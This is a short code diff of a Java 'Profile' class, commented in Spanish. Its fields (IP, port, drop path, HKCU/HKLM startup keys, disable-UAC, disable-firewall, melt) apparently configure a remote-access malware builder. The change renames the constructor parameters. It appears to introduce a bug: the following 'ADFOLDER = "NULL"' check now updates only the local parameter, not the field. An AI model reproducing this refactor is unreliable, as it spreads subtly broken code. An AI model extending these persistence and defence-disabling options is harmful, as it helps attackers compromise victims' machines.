@@ -15,21 +15,21 @@ public class Profile {
     String ADDFIREWALL;
     String MELT;
     
-    public Profile(String recvName, String recvIP, String recvPort,
-    String recvPath, String recvFile, String recvADFolder, String recvHKCU, String recvHKLM, String recvDISABLEUAC, String recvDISABLEFIREWALL, String recvADDFIREWALL, String recvMELT){
+    public Profile(String NAME, String IP, String PORT,
+    String PATH, String FILE, String ADFOLDER, String HKCU, String HKLM, String DISABLEUAC, String DISABLEFIREWALL, String ADDFIREWALL, String MELT){
         // RELLENAMOS LAS VARIABLES GLOBALES CON LAS RECIBIDAS POR ARGUMENTOS
-        NAME = recvName;
-        IP = recvIP;
-        PORT = recvPort;
-        PATH = recvPath;
-        FILE = recvFile;
-        ADFOLDER = recvADFolder;
-        HKCU = recvHKCU;
-        HKLM = recvHKLM;
-        DISABLEUAC = recvDISABLEUAC;
-        DISABLEFIREWALL = recvDISABLEFIREWALL;
-        ADDFIREWALL = recvADDFIREWALL;
-        MELT = recvMELT;
+        this.NAME = NAME;
+        this.IP = IP;
+        this.PORT = PORT;
+        this.PATH = PATH;
+        this.FILE = FILE;
+        this.ADFOLDER = ADFOLDER;
+        this.HKCU = HKCU;
+        this.HKLM = HKLM;
+        this.DISABLEUAC = DISABLEUAC;
+        this.DISABLEFIREWALL = DISABLEFIREWALL;
+        this.ADDFIREWALL = ADDFIREWALL;
+        this.MELT = MELT;
         
         if(ADFOLDER.equals("")){    // Si ADFOLDER está vacío...
             ADFOLDER = "NULL";  // Ponemos NULL (para que no haya errores cargándo el archivo "profiles.dat"
